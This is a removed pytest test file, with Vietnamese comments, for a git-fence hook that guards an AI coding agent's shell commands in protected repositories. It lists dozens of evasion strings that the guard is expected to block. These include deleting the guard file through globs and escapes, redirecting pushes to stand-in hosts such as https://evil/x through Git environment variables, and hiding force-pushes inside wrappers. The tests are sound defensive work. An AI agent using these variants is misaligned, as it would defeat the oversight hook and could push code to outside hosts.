-    """Dấu hiệu 3 ở nhánh dự phòng (Astra RV6): `.agile.json` đã xoá khỏi cây làm việc nhưng chỉ mục còn → vẫn chặn khi không có Python."""
-    import shutil
-    import subprocess
-    real_git = shutil.which("git")
-    if real_git is None:
-        pytest.skip("không có git")
-    shim_dir = tmp_path / "shim"
-    shim_dir.mkdir()
-    shim = shim_dir / "git"
-    shim.write_text('#!/bin/sh\nexec "{}" "$@"\n'.format(fwd(real_git)), encoding="utf-8")
-    os.chmod(shim, 0o755)
-    repo = tmp_path / "idx"
-    repo.mkdir()
-    env = dict(os.environ, GIT_CONFIG_GLOBAL=os.devnull, GIT_CONFIG_SYSTEM=os.devnull)
-    for args in (["init", "-q"], ["config", "user.email", "t@e.x"], ["config", "user.name", "t"]):
-        subprocess.run(["git", "-C", str(repo), *args], check=True, env=env)
-    (repo / ".agile.json").write_text("{}", encoding="utf-8")
-    subprocess.run(["git", "-C", str(repo), "add", ".agile.json"], check=True, env=env)
-    subprocess.run(["git", "-C", str(repo), "commit", "-q", "-m", "x"], check=True, env=env)
-    (repo / ".agile.json").unlink()  # xoá khỏi cây làm việc, chỉ mục vẫn theo dõi
-    done = run_launcher(repo, claude("git push", repo), [shim_dir, bare_sh_ok])
-    if done.returncode == 0:
-        pytest.skip("launcher tìm thấy Python dùng được (guard chạy bình thường)")
-    assert done.returncode == 2 and "git-fence" in done.stderr, done.stderr
-
-
-# --- security review SC1–SC3 (SPR-16 vòng 2) ----------------------------------------------------------------------------------
-
-def contract_world(tmp_path, monkeypatch):
-    """Repo có file dấu với hợp đồng đích hợp lệ, danh sách bảo vệ có repo, runner trả URL khớp: một lệnh đẩy hợp lệ phải qua."""
-    marker = {"level": "gate_1_2", "scope": ["gate_1", "gate_2"], "expires": "sprint_end", "exclusions": NO_PUSH,
-              "grant_at": "2026-11-20 09:00 +07", "sprints": ["SPR-20"], "push_remote": "origin",
-              "push_urls": ["https://example.com/o/r.git"], "push_targets": ["refs/heads/spr-20-x"], "git_common_dir": ""}
-    repo = protected_repo(tmp_path, branch="spr-20-x", marker=marker)
-    marker["git_common_dir"] = str(repo / ".git")
-    (repo / ".tmp" / "autopilot.json").write_text(json.dumps(marker), encoding="utf-8")
-    (repo / ".git" / "config").write_text('[remote "origin"]\n\turl = https://example.com/o/r.git\n', encoding="utf-8")
-    heads = repo / ".git" / "refs" / "remotes" / "origin"
-    heads.mkdir(parents=True)
-    (heads / "HEAD").write_text("ref: refs/remotes/origin/main\n", encoding="utf-8")
-    listing = tmp_path / "protected.json"
-    listing.write_text(json.dumps({"repos": [{"git_common_dir": str(repo / ".git")}]}), encoding="utf-8")
-    monkeypatch.setenv(git_fence.ENV_LIST, str(listing))
-    monkeypatch.setattr(git_fence, "default_runner", lambda argv, cwd, t: (0, "https://example.com/o/r.git\n"))
-    return repo
-
-
-def test_contract_push_passes_in_the_clean_world(tmp_path, monkeypatch):
-    repo = contract_world(tmp_path, monkeypatch)
-    assert run("claude", claude("git push origin spr-20-x", repo)) == (0, "", "")
-
-
-@pytest.mark.parametrize("cmd", [
-    "GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=remote.origin.pushurl GIT_CONFIG_VALUE_0=https://evil/x git push origin spr-20-x",
-    "env GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=url.https://evil/.insteadOf GIT_CONFIG_VALUE_0=https://example.com/ git push origin spr-20-x",
-    "GIT_SSH_COMMAND=evil git push origin spr-20-x",
-    "GIT_CONFIG_PARAMETERS=x git push origin spr-20-x",
-    "GIT_CONFIG_GLOBAL=/tmp/x git push origin spr-20-x",
-    "export GIT_CONFIG_COUNT=1 && git push origin spr-20-x",
-    "$env:GIT_SSH_COMMAND='evil'; git push origin spr-20-x",
-])
-def test_git_environment_variables_void_the_push_contract(tmp_path, monkeypatch, cmd):
-    repo = contract_world(tmp_path, monkeypatch)
-    rc, _, err = run("claude", claude(cmd, repo))
-    assert rc == 2 and "push-repo-unverified" in err, (cmd, err)
-
-
-def test_repo_with_include_makes_unknown_subcommands_unparsed(tmp_path):
-    repo = protected_repo(tmp_path, branch="x")
-    with open(repo / ".git" / "config", "a", encoding="utf-8") as handle:
-        handle.write("[include]\n\tpath = extra.cfg\n")
-    assert run("claude", claude("git p origin HEAD:main", repo))[0] == 2  # alias có thể nằm trong file được include
-    assert run("claude", claude("git status", repo)) == (0, "", "")
-
-
-@pytest.mark.parametrize("cmd", [
-    "rm .agil*", "rm .agile.js?n", "rm *.json", "rm $(echo .agile).json", "F=.agile.json; rm $F",
-    'echo {} > "$AGENT_AGILE_PROTECTED_REPOS"', "cp /dev/null $AGENT_AGILE_PROTECTED_REPOS",
-    "cd sub && rm .agile.json", "mv .agile.json .agile.bak",
-    "cd sub && rm ../.agil*", "cd sub && rm ../*.json", "cd sub && rm *.json", "rm sub/../.agil*", "rm ./*.json",
-])
-def test_dynamic_and_glob_targets_of_the_guard_files_are_denied(tmp_path, cmd):
-    repo = protected_repo(tmp_path)
-    (repo / "sub").mkdir()
-    rc, _, err = run("claude", claude(cmd, repo))
-    assert rc == 2 and "git-fence" in err, (cmd, err)
-
-
-@pytest.mark.parametrize("cmd", ["rm build/*.o", "rm -f out.txt", "cp a.txt b.txt", "echo hi > notes.txt", "rm $TMPDIR/x", "touch $HOME/f"])
-def test_ordinary_file_commands_in_protected_repo_are_not_blocked(tmp_path, cmd):
-    repo = protected_repo(tmp_path)
-    assert run("claude", claude(cmd, repo)) == (0, "", ""), cmd
-
-
-def test_absolute_glob_at_repo_root_is_denied_even_after_cd(tmp_path):
-    repo = protected_repo(tmp_path)
-    (repo / "sub").mkdir()
-    for cmd in ("rm {}/*.json".format(fwd(repo)), "cd sub && rm {}/.agil*".format(fwd(repo))):
-        rc, _, err = run("claude", claude(cmd, repo))
-        assert rc == 2 and "git-fence" in err, cmd
-    assert run("claude", claude("rm {}/sub/*.o".format(fwd(repo)), repo)) == (0, "", "")
-
-
-# --- security vòng 3 (SX1–SX7) -----------------------------------------------------------------------------------------------
-
-@pytest.mark.parametrize("cmd", [
-    "git_ssh_command=x git push origin spr-20-x",
-    "env 'GI'T_SSH_COMMAND=x git push origin spr-20-x",
-    'env "GIT"_SSH_COMMAND=x git push origin spr-20-x',
-    "G=GIT_; export ${G}SSH_COMMAND=x; git push origin spr-20-x",
-    "git --exec-path=/t push origin spr-20-x",
-    "$env:git_ssh_command='x'; git push origin spr-20-x",
-])
-def test_git_env_variants_still_void_the_push_contract(tmp_path, monkeypatch, cmd):
-    repo = contract_world(tmp_path, monkeypatch)
-    rc, _, err = run("claude", claude(cmd, repo))
-    assert rc == 2, (cmd, err)
-
-
-@pytest.mark.parametrize("cmd", [
-    "git branch -M main && git push origin HEAD", "git symbolic-ref HEAD refs/heads/main && git push origin HEAD",
-    "git checkout main && git push origin HEAD", "git switch main; git push origin @", "git update-ref HEAD x && git push origin HEAD",
-])
-def test_push_head_after_a_command_that_moves_head_is_unverified(tmp_path, monkeypatch, cmd):
-    repo = contract_world(tmp_path, monkeypatch)
-    rc, _, err = run("claude", claude(cmd, repo))
-    assert rc == 2, (cmd, err)
-
-
-def test_push_head_alone_is_still_allowed_on_the_sprint_branch(tmp_path, monkeypatch):
-    repo = contract_world(tmp_path, monkeypatch)
-    assert run("claude", claude("git push origin HEAD", repo)) == (0, "", "")
-
-
-@pytest.mark.parametrize("cmd", [
-    "git rm -f .agil*", 'git rm ".agil*"', "git rm -rf .", "git rm -rf :/", "git mv .agil* x", "git rm *.json", "git mv . ../x",
-])
-def test_git_rm_mv_of_the_agile_json_by_glob_or_root_pathspec_is_denied(tmp_path, cmd):
-    repo = protected_repo(tmp_path)
-    rc, _, err = run("claude", claude(cmd, repo))
-    assert rc == 2, (cmd, err)
-
-
-@pytest.mark.parametrize("cmd", [
-    "git config core.sshCommand x", "git config core.gitProxy x", "git config http.proxy x", "git config credential.helper x",
-    "git config http.extraHeader x", "git config push.default x", "git config core.fsmonitor x",
-    "echo x >> .git/config", "sed -i s/a/b/ .git/config", "cp x .git/config", "tee .git/hooks/pre-push",
-])
-def test_persistent_transport_config_and_git_config_file_writes_are_denied(tmp_path, cmd):
-    repo = protected_repo(tmp_path)
-    rc, _, err = run("claude", claude(cmd, repo))
-    assert rc == 2, (cmd, err)
-
-
-@pytest.mark.parametrize("cmd", [
-    "rm .agile.{json,bak}", "rm .agile.js{on,}", "echo {} >| .agile.json", "echo {}>>.agile.json", "echo {}>.agile.json",
-    "rm ../r*/.agil*", "rm /mnt/*/*/.agil*", "rm ../*/.agile.json",
-])
-def test_brace_redirect_and_parent_glob_forms_are_denied(tmp_path, cmd):
-    repo = protected_repo(tmp_path)
-    rc, _, err = run("claude", claude(cmd, repo))
-    assert rc == 2, (cmd, err)
-
-
-@pytest.mark.parametrize("cmd", [
-    "gh pr create -Revil/x --title x", "gh pr create -R=evil/x --title x", "GH_REPO=evil/x gh pr create --title x",
-    "GH_HOST=evil.example gh pr create --title x", "gh_repo=evil/x gh pr create --title x",
-])
-def test_gh_attached_repo_flag_and_gh_environment_void_the_contract(tmp_path, monkeypatch, cmd):
-    repo = contract_world(tmp_path, monkeypatch)
-    rc, _, err = run("claude", claude(cmd, repo))
-    assert rc == 2, (cmd, err)
-
-
-def test_gh_pr_create_for_the_verified_repo_passes_with_contract(tmp_path, monkeypatch):
-    repo = contract_world(tmp_path, monkeypatch)
-    assert run("claude", claude("gh pr create -R o/r --title x", repo)) == (0, "", "")
-
-
-def test_include_repo_does_not_block_more_builtin_subcommands(tmp_path):
-    repo = protected_repo(tmp_path, branch="x")
-    with open(repo / ".git" / "config", "a", encoding="utf-8") as handle:
-        handle.write("[include]\n\tpath = extra.cfg\n")
-    for sub in ("sparse-checkout list", "maintenance run", "range-diff a b", "hash-object f", "var -l", "show-branch", "diff-index HEAD", "cherry", "prune", "repack", "credential fill"):
-        assert run("claude", claude("git " + sub, repo)) == (0, "", ""), sub
-
-
-# --- vòng 4 (Astra RY1–RY5) ---------------------------------------------------------------------------------------------------
-
-def test_alias_does_not_hide_head_moves(tmp_path, monkeypatch):
-    repo = contract_world(tmp_path, monkeypatch)
-    with open(repo / ".git" / "config", "a", encoding="utf-8") as handle:
-        handle.write("[alias]\n\tp = push\n\tsw = checkout\n")
-    for cmd in ("git branch -M main && git p origin HEAD", "git sw main && git push origin HEAD", "git sw main && git p origin @"):
-        rc, _, err = run("claude", claude(cmd, repo))
-        assert rc == 2, (cmd, err)
-    assert run("claude", claude("git p origin HEAD", repo)) == (0, "", "")
-
-
-@pytest.mark.parametrize("cmd", ["rm .git/confi?", "rm .git/hook?/pre-push", "rm .git/hooks/*", "rm .git/c*", "rm -f .git/hooks/pre-pus?"])
-def test_globs_over_git_config_and_hooks_are_denied(tmp_path, cmd):
-    repo = protected_repo(tmp_path)
-    rc, _, err = run("claude", claude(cmd, repo))
-    assert rc == 2, (cmd, err)
-
-
-def test_dot_git_lookalike_names_outside_dot_git_are_not_blocked(tmp_path):
-    repo = protected_repo(tmp_path)
-    (repo / ".github").mkdir()
-    for cmd in ("rm .github/old.yml", "rm .gitignore", "rm .gitattributes", "echo x > .github/CODEOWNERS"):
-        assert run("claude", claude(cmd, repo)) == (0, "", ""), cmd
-
-
-def test_brace_expansion_beyond_the_limit_closes(tmp_path):
-    repo = protected_repo(tmp_path)
-    many = ",".join(["x"] * 70)
-    for cmd in ("rm .agile.{" + many + ",json}", "rm " + "{" * 1200 + "a" + "}" * 1200, "rm {a,b}{c,d}{e,f}{g,h}{i,j}{k,l}{m,n}{o,p}.txt"):
-        rc, _, err = run("claude", claude(cmd, repo))
-        assert rc == 2 and "Traceback" not in err, cmd[:50]
-
-
-def test_git_and_gh_words_in_content_do_not_void_the_contract(tmp_path, monkeypatch):
-    repo = contract_world(tmp_path, monkeypatch)
-    assert run("claude", claude("echo GIT_HELLO; git push origin spr-20-x", repo)) == (0, "", "")
-    assert run("claude", claude('git commit -m "ghi chu ve GIT_DIR" && git push origin spr-20-x', repo)) == (0, "", "")
-    assert run("claude", claude("gh pr create --title GH_TEST -R o/r", repo)) == (0, "", "")
-
-
-# --- vòng 4 security (SZ1–SZ7) --------------------------------------------------------------------------------------------------
-
-@pytest.mark.parametrize("cmd", [
-    "G=GIT_SSH_COMMAND; env $G=x git push origin spr-20-x", "env $G=x git push --force origin main", 'env "$X" git push origin main',
-    "env $G=x gh pr create -R evil/x --title x", "nice $A git push origin main",
-])
-def test_command_word_with_a_variable_after_env_does_not_hide_git(tmp_path, monkeypatch, cmd):
-    repo = contract_world(tmp_path, monkeypatch)
-    rc, _, err = run("claude", claude(cmd, repo))
-    assert rc == 2, (cmd, err)
-
-
-@pytest.mark.parametrize("cmd", [
-    "git rm -rf ':(top)'", "git rm -f ':(top).agile.json'", "git rm -f ':(literal).agile.json'", "git rm -f ':(icase).AGILE.json'",
-    "git rm -rf :/.agil*", "git rm -rf $PWD", "git rm -rf sub/..", "git rm -rf ././", "cd sub && git rm -rf ..", "git rm --pathspec-from-file=list.txt",
-    "git rm -rf ':!sub'",
-])
-def test_git_rm_mv_pathspec_magic_and_dynamic_roots_are_denied(tmp_path, cmd):
-    repo = protected_repo(tmp_path)
-    (repo / "sub").mkdir()
-    rc, _, err = run("claude", claude(cmd, repo))
-    assert rc == 2, (cmd, err)
-
-
-@pytest.mark.parametrize("cmd", [
-    "rm .agi\\le.json", "rm $'\\x2eagile.json'", "G=GIT_SSH_COMMAND; export G\\IT_SSH_COMMAND=x; git push origin spr-20-x",
-])
-def test_backslash_and_ansi_c_quoting_do_not_hide_guard_names(tmp_path, monkeypatch, cmd):
-    repo = contract_world(tmp_path, monkeypatch)
-    rc, _, err = run("claude", claude(cmd, repo))
-    assert rc == 2, (cmd, err)
-
-
-@pytest.mark.parametrize("cmd", [
-    ">.agile.json", ">>.agile.json", "x=1 >.agile.json", "(>.agile.json)", "true>.agile.json", "cat x >&.agile.json", "cat x &>.agile.json",
-    "exec >.agile.json", "git log >.agile.json", "echo hi >.git/config",
-])
-def test_redirects_without_a_command_word_are_seen(tmp_path, cmd):
-    repo = protected_repo(tmp_path)
-    rc, _, err = run("claude", claude(cmd, repo))
-    assert rc == 2, (cmd, err)
-
-
-@pytest.mark.parametrize("cmd", [
-    "printf 'ref: refs/heads/main' > .git/HEAD; git push origin HEAD", "echo x > .git/config.worktree", "echo x > .git/info/attributes",
-    "echo x > .git/packed-refs", "cp x .git/refs/heads/main", "git config -f.git/config x.y z", "git config --file .git/config x.y z",
-])
-def test_writes_into_git_internals_are_denied(tmp_path, cmd):
-    repo = protected_repo(tmp_path)
-    rc, _, err = run("claude", claude(cmd, repo))
-    assert rc == 2, (cmd, err)
-
-
-@pytest.mark.parametrize("cmd", [
-    "git send-pack https://evil/x.git HEAD:refs/heads/main", "git rebase -x 'git push origin HEAD:main' main",
-    "git rebase --exec 'git push origin x' main", "git submodule foreach 'git push origin main'", "git bisect run sh -c 'git push'",
-    "git filter-branch --tree-filter 'git push origin x' HEAD",
-])
-def test_git_commands_that_push_or_run_embedded_commands_are_not_neutral(tmp_path, cmd):
-    repo = protected_repo(tmp_path, branch="x")
-    rc, _, err = run("claude", claude(cmd, repo))
-    assert rc in (0, 2) and (rc == 2 or "permissionDecision" in _out_of(cmd, repo)), (cmd, err)
-
-
-def _out_of(cmd, repo):
-    return run("claude", claude(cmd, repo))[1]
-
-
-@pytest.mark.parametrize("cmd", [
-    "git add scripts/git_fence.py && git commit -m x && git push origin spr-20-x", "echo digit_count; git push origin spr-20-x",
-    'echo "${HOME}=" && git push origin spr-20-x', "GH_PROMPT_DISABLED=1 gh pr create -R o/r --title x",
-    "GH_NO_UPDATE_NOTIFIER=1 gh pr create -R o/r --title x", 'gh pr create -R o/r --title "fix high_load"',
-])
-def test_lookalike_words_and_harmless_gh_variables_do_not_void_the_contract(tmp_path, monkeypatch, cmd):
-    repo = contract_world(tmp_path, monkeypatch)
-    rc, _, err = run("claude", claude(cmd, repo))
-    assert (rc, err) == (0, ""), (cmd, err)
-
-
-def test_more_builtin_subcommands_with_include(tmp_path):
-    repo = protected_repo(tmp_path, branch="x")
-    with open(repo / ".git" / "config", "a", encoding="utf-8") as handle:
-        handle.write("[include]\n\tpath = extra.cfg\n")
-    for sub in ("update-ref -h", "hook list", "replay -h", "lfs ls-files", "index-pack -h"):
-        rc, out, err = run("claude", claude("git " + sub, repo))
-        assert (rc, err) == (0, ""), sub
-
-
-# --- vòng 5: chặn nhầm nội dung nháy và cờ gộp của gh ----------------------------------------------------------------------
-
-@pytest.mark.parametrize("cmd", [
-    'echo "x > .git/config"', 'echo "git rm :(top)"', "git config -f .git/config --get user.name",
-    'echo "chuyen huong > .agile.json la cam"', "echo 'a >> .agile.json b'",
-])
-def test_quoted_text_that_only_looks_like_a_forbidden_write_is_allowed(tmp_path, cmd):
-    repo = protected_repo(tmp_path)
-    assert run("claude", claude(cmd, repo)) == (0, "", ""), cmd
-
-
-@pytest.mark.parametrize("cmd", ['echo > ".agile.json"', "echo hi >.agile.json", "echo > '.git/config'"])
-def test_quoted_redirect_target_without_spaces_is_still_a_write(tmp_path, cmd):
-    repo = protected_repo(tmp_path)
-    assert run("claude", claude(cmd, repo))[0] == 2, cmd
-
-
-def test_env_assignment_text_inside_arguments_does_not_void_the_contract(tmp_path, monkeypatch):
-    repo = contract_world(tmp_path, monkeypatch)
-    for cmd in ("echo GIT_DIR=example; git push origin spr-20-x", 'git commit -m "env GIT_DIR=note" && git push origin spr-20-x'):
-        assert run("claude", claude(cmd, repo)) == (0, "", ""), cmd
-    for cmd in ("A=1 GIT_X=2 git push origin spr-20-x", "FOO=1; GIT_SSH_COMMAND=x git push origin spr-20-x"):
-        assert run("claude", claude(cmd, repo))[0] == 2, cmd
-
-
-def test_gh_combined_short_flags_ending_in_r_name_the_repository(tmp_path, monkeypatch):
-    repo = contract_world(tmp_path, monkeypatch)
-    for cmd in ("gh pr create -fR evil/x --title x", "gh pr create -tR evil/x"):
-        assert run("claude", claude(cmd, repo))[0] == 2, cmd
-
-
-# --- vòng 5 security (SY1–SY5) -----------------------------------------------------------------------------------------------
-
-@pytest.mark.parametrize("cmd", [
-    "export $G=x; git push origin spr-20-x", "G=GIT_CONFIG_COUNT; export $G=1; git push origin spr-20-x", "declare -x $G=x; git push origin spr-20-x",
-    "GIT_SSH_COMMAND=evil bash -c 'git push origin spr-20-x'", 'env GIT_SSH_COMMAND=evil sh -c "git push origin spr-20-x"',
-    "GIT_CONFIG_COUNT=1 eval 'git push origin spr-20-x'",
-])
-def test_environment_set_outside_the_nested_shell_voids_the_contract(tmp_path, monkeypatch, cmd):
-    repo = contract_world(tmp_path, monkeypatch)
-    assert run("claude", claude(cmd, repo))[0] == 2, cmd
-
-
-def test_echo_with_variable_equals_text_is_not_an_assignment(tmp_path, monkeypatch):
-    repo = contract_world(tmp_path, monkeypatch)
-    assert run("claude", claude('echo "${HOME}=" && git push origin spr-20-x', repo)) == (0, "", "")
-
-
-@pytest.mark.parametrize("cmd", [
-    "env FO\\O=1 git push --force origin x", "env A.B=1 git push --force origin x",
-    "g\\it push --force origin x", "git pu\\sh --force origin x", "git $'push' --force origin x", "$'git' push --force origin x",
-    "setsid git push --force origin x", "ionice -c3 git push --force origin x", "doas git push --force origin x",
-])
-def test_escaped_or_odd_command_words_and_wrappers_still_reach_the_classifier(tmp_path, cmd):
-    repo = protected_repo(tmp_path, branch="x")
-    assert run("claude", claude(cmd, repo))[0] == 2, cmd
-
-
-def test_absolute_and_relative_repo_root_pathspecs_for_git_rm_are_denied(tmp_path):
-    repo = protected_repo(tmp_path)
-    for cmd in ("git rm -rf {}".format(fwd(repo)), "git rm -rf ../{}".format(repo.name), "git mv {} ../x".format(fwd(repo))):
-        assert run("claude", claude(cmd, repo))[0] == 2, cmd
-    (repo / "sub").mkdir()
-    assert run("claude", claude("git rm -f sub/x.txt", repo))[0] == 0
-
-
-@pytest.mark.parametrize("cmd", [
-    "git rebase -xmake main", "git rebase -ix main", "git rebase -x'git push' main", "git commit -nm x", "git commit -n -m x", "git commit -anm x",
-])
-def test_attached_exec_flag_and_short_no_verify_are_seen(tmp_path, cmd):
-    repo = protected_repo(tmp_path, branch="x")
-    assert run("claude", claude(cmd, repo))[0] == 2, cmd
-
-
-def test_short_n_is_dry_run_for_push_and_not_no_verify(tmp_path):
-    repo = protected_repo(tmp_path, branch="x")
-    rc, out, _ = run("claude", claude("git push -n origin x", repo))
-    assert rc == 0 and "ask" in out  # hỏi như mọi lệnh đẩy, không bị coi là --no-verify
-
-
-@pytest.mark.parametrize("cmd,rc_expected", [("gh pr merge -dR evil/x 1", 0), ("gh release create -dR evil/x v1", 2)])
-def test_gh_merge_and_release_with_combined_flags_are_recognised(tmp_path, monkeypatch, cmd, rc_expected):
-    outside = tmp_path / "outside"
-    outside.mkdir()
-    (outside / ".git").mkdir()
-    listing = tmp_path / "protected.json"
-    listing.write_text(json.dumps({"repos": [{"remote_urls": ["https://github.com/evil/x.git"]}]}), encoding="utf-8")
-    monkeypatch.setenv(git_fence.ENV_LIST, str(listing))
-    monkeypatch.setattr(git_fence, "default_runner", lambda *a, **k: (1, ""))
-    rc, out, _ = run("claude", claude(cmd, outside))
-    assert rc == rc_expected and (rc == 2 or "ask" in out), cmd  # merge: hỏi; release: chặn
-
-
-def test_gh_repo_flag_with_url_forms_is_normalised(tmp_path, monkeypatch):
-    repo = contract_world(tmp_path, monkeypatch)
-    assert run("claude", claude("gh pr create -R https://example.com/o/r --title x", repo)) == (0, "", "")
-    assert run("claude", claude("gh pr create -R github.com/evil/x --title x", repo))[0] == 2
-
-
-@pytest.mark.parametrize("cmd", ["git branch -M main && git commit -m x", "git symbolic-ref HEAD refs/heads/main; git commit -m x"])
-def test_commit_after_a_command_that_moves_head_is_treated_as_on_a_protected_branch(tmp_path, cmd):
-    repo = protected_repo(tmp_path, branch="x")
-    assert run("claude", claude(cmd, repo))[0] == 2, cmd
-
-
-# --- security vòng 5 (SV1–SV5) --------------------------------------------------------------------------------------------------
-
-@pytest.mark.parametrize("cmd", [
-    "git status\nGIT_SSH_COMMAND=x git push origin spr-20-x", "\nFOO=1 GIT_CONFIG_COUNT=1 git push origin spr-20-x",
-    "\nGH_REPO=x/y gh pr create --title x", "sudo GIT_SSH_COMMAND=x git push origin spr-20-x", "time GIT_X=1 git push origin spr-20-x",
-    "! GIT_X=1 git push origin spr-20-x", "command GIT_SSH_COMMAND=x git push origin spr-20-x",
-    "if true; then GIT_X=1 git push origin spr-20-x; fi", "{ GIT_X=1 git push origin spr-20-x; }",
-    "bash -c 'export GIT_SSH_COMMAND=x; git push origin spr-20-x'", "bash -c 'export GH_REPO=x/y; gh pr create --title x'",
-])
-def test_env_assignments_in_any_position_void_the_contract(tmp_path, monkeypatch, cmd):
-    repo = contract_world(tmp_path, monkeypatch)
-    assert run("claude", claude(cmd, repo))[0] == 2, cmd
-
-
-def test_pathspec_magic_inside_a_nested_shell_string_is_still_seen(tmp_path):
-    repo = protected_repo(tmp_path)
-    assert run("claude", claude("bash -c 'echo a b; git rm -rf :(top)'", repo))[0] == 2
-
-
-@pytest.mark.parametrize("cmd", [
-    "su -c 'git push --force origin main'", "find . -name x -exec git push --force origin main ;", "wsl git push --force origin main",
-    "parallel git push --force origin main", "watch git push --force origin main", "runuser -l u -c 'git push --force origin main'",
-    "script -c 'git push --force origin main'", "chrt 1 git push --force origin main", "flock f git push --force origin main",
-])
-def test_unknown_wrappers_do_not_hide_git_or_gh(tmp_path, cmd):
-    repo = protected_repo(tmp_path, branch="x")
-    assert run("claude", claude(cmd, repo))[0] == 2, cmd
-
-
-def test_stderr_redirection_after_a_push_does_not_break_the_contract(tmp_path, monkeypatch):
-    repo = contract_world(tmp_path, monkeypatch)
-    for cmd in ("git push origin spr-20-x 2>&1", "git push origin spr-20-x > out.txt", "git push origin spr-20-x 2>/dev/null"):
-        assert run("claude", claude(cmd, repo)) == (0, "", ""), cmd
-
-
-def test_gh_repo_flag_keeps_the_host_when_it_is_given(tmp_path, monkeypatch):
-    repo = contract_world(tmp_path, monkeypatch)
-    assert run("claude", claude("gh pr create -R https://evil.com/o/r --title x", repo))[0] == 2
-    assert run("claude", claude("gh pr create -R https://example.com/o/r --title x", repo)) == (0, "", "")
-
-
-def test_parentheses_inside_a_quoted_commit_message_are_text_not_separators(tmp_path):
-    repo = protected_repo(tmp_path, branch="x")
-    assert run("claude", claude('git commit -m "feat(guard): doc ghi .agile.json va them rao"', repo)) == (0, "", "")
-
-
-def test_command_substitution_inside_quotes_is_still_split_and_seen(tmp_path):
-    repo = protected_repo(tmp_path, branch="x")
-    assert run("claude", claude('echo "a $(git push --force origin main) b"', repo))[0] == 2
-
-
-# --- security vòng 6 (RF1–RF5 của bản sửa 67f129b) -----------------------------------------------------------------------------
-
-@pytest.mark.parametrize("cmd", [
-    "git push origin spr-20-x 2>&1 --force", "git push origin spr-20-x 2>&1 main", "git push origin spr-20-x 2>&1 --delete main",
-    "git push origin spr-20-x 2>&1 :refs/heads/main", "git push origin spr-20-x >&2 main", "git push origin spr-20-x 1>&2 +spr-20-x:main",
-    "git push origin spr-20-x 2>&1 --repo=https://evil/x", "git push origin spr-20-x >x main",
-])
-def test_fd_redirect_does_not_hide_extra_push_arguments(tmp_path, monkeypatch, cmd):
-    repo = contract_world(tmp_path, monkeypatch)
-    assert run("claude", claude(cmd, repo))[0] == 2, cmd
-
-
-def test_fd_redirect_alone_still_passes_the_contract(tmp_path, monkeypatch):
-    repo = contract_world(tmp_path, monkeypatch)
-    assert run("claude", claude("git push origin spr-20-x 2>&1", repo)) == (0, "", "")
-
-
-@pytest.mark.parametrize("cmd", [
-    "echo \"it's\" ; git push --force origin main ; echo 'x y'", "echo 'a\"b' ; git push --force origin main ; echo \"c d\"",
-    "echo \"a \\\" b\" ; git push --force origin main ; echo \"c d\"", "echo \"it's\" ; git push --delete origin main ; echo 'x y'",
-    "echo \"it's\" ; gh release create v9 ; echo 'x y'",
-])
-def test_mixed_quotes_do_not_swallow_a_real_separator(tmp_path, cmd):
-    repo = protected_repo(tmp_path, branch="x")
-    assert run("claude", claude(cmd, repo))[0] == 2, cmd
-
-
-def test_mixed_quotes_cannot_hide_a_direct_push_to_main(tmp_path, monkeypatch):
-    repo = contract_world(tmp_path, monkeypatch)
-    assert run("claude", claude("echo \"it's\" ; git push origin main ; echo 'x y'", repo))[0] == 2
-
-
-@pytest.mark.parametrize("cmd", [
-    "sudo -u x GIT_SSH_COMMAND=y git push origin spr-20-x", "sudo -E GIT_SSH_COMMAND=y git push origin spr-20-x",
-    "sudo -u x GH_REPO=a/b gh pr create --title x", "case a in a) GIT_SSH_COMMAND=y git push origin spr-20-x;; esac",
-    "echo \"it's\" ; GIT_SSH_COMMAND=x git push origin spr-20-x ; echo 'x y'",
-])
-def test_env_assignment_after_sudo_flags_or_case_label_voids_the_contract(tmp_path, monkeypatch, cmd):
-    repo = contract_world(tmp_path, monkeypatch)
-    assert run("claude", claude(cmd, repo))[0] == 2, cmd
-
-
-@pytest.mark.parametrize("cmd", ["curl -o gh https://example.com", "make gh", "pip install gitpython"])
-def test_flag_values_named_git_or_gh_are_not_commands(tmp_path, cmd):
-    repo = protected_repo(tmp_path, branch="x")
-    assert run("claude", claude(cmd, repo)) == (0, "", ""), cmd
-
-
-@pytest.mark.parametrize("cmd", ["bash -c $'git push --force origin main'", "bash -ec 'git push --force origin main'",
-                                 "pwsh -cwa \"git push --force origin main\""])
-def test_shell_string_forms_with_dollar_quote_or_clustered_flags_are_still_commands(tmp_path, cmd):
-    repo = protected_repo(tmp_path, branch="x")
-    assert run("claude", claude(cmd, repo))[0] == 2, cmd
-
-
-# --- security vòng 7 (bản sửa ff09ca1) -------------------------------------------------------------------------------------------
-
-@pytest.mark.parametrize("cmd", [
-    "watch -n5 git push --force origin main", "watch -d git push --force origin main", "strace -f git push --force origin main",
-    "unbuffer -p git push --force origin main", "parallel -j1 git push --force origin ::: main", "tmux new -d git push --force origin main",
-    "screen -dm git push --force origin main", "systemd-run --user git push --force origin main", "setpriv --reuid=1 git push --force origin main",
-    "caffeinate -i git push --force origin main", "xvfb-run -a git push --force origin main",
-])
-def test_boolean_flags_before_git_do_not_hide_it(tmp_path, cmd):
-    repo = protected_repo(tmp_path, branch="x")
-    assert run("claude", claude(cmd, repo))[0] == 2, cmd
-
-
-def test_backslash_is_not_an_escape_in_powershell(tmp_path):
-    repo = protected_repo(tmp_path, branch="x")
-    for cmd in ('echo "C:\\my dir\\" ; git push --force origin main ; echo "a b"', 'echo "C:\\dir\\" ; git push --force origin main ; echo "a b"'):
-        assert run("claude", claude(cmd, repo, tool="PowerShell"))[0] == 2, cmd
-
-
-@pytest.mark.parametrize("cmd", [
-    "git push origin spr-20-x &>/dev/null main", "git push origin spr-20-x &> x main", "git push origin spr-20-x &>>x main",
-    "git push origin spr-20-x >&file main", "git push origin spr-20-x >& file main", "git push origin spr-20-x 2>& 1 main",
-])
-def test_ampersand_redirect_forms_do_not_hide_extra_push_arguments(tmp_path, monkeypatch, cmd):
-    repo = contract_world(tmp_path, monkeypatch)
-    assert run("claude", claude(cmd, repo))[0] == 2, cmd
-
-
-@pytest.mark.parametrize("cmd", [
-    "echo $'it\\'s' ; git push --force origin main ; echo 'x y'", "echo \"$(printf '\"')\" ; git push --force origin main ; echo \"a b\"",
-])
-def test_ansi_c_quotes_and_nested_quotes_do_not_hide_a_separator(tmp_path, cmd):
-    repo = protected_repo(tmp_path, branch="x")
-    assert run("claude", claude(cmd, repo))[0] == 2, cmd
-
-
-def test_redirect_to_the_guard_file_with_ampersand_form_is_still_seen(tmp_path):
-    repo = protected_repo(tmp_path, branch="x")
